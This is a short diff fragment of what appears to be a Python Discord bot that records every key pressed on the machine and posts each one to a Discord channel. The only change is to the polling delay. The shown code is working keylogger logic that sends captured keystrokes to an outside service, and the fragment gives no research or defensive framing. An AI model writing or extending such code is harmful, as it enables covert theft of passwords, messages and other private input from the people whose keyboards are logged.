@@ -53,7 +53,7 @@ async def on_ready():
         if event.event_type == keyboard.KEY_DOWN:
                 await channel.send(event.name)  # Send the specific key that was pressed
         
-        time.sleep(0.05)  # Adjust the interval as needed
+        time.sleep(0.2)  # Adjust the interval as needed
 
 bot.run(TOKEN)
 
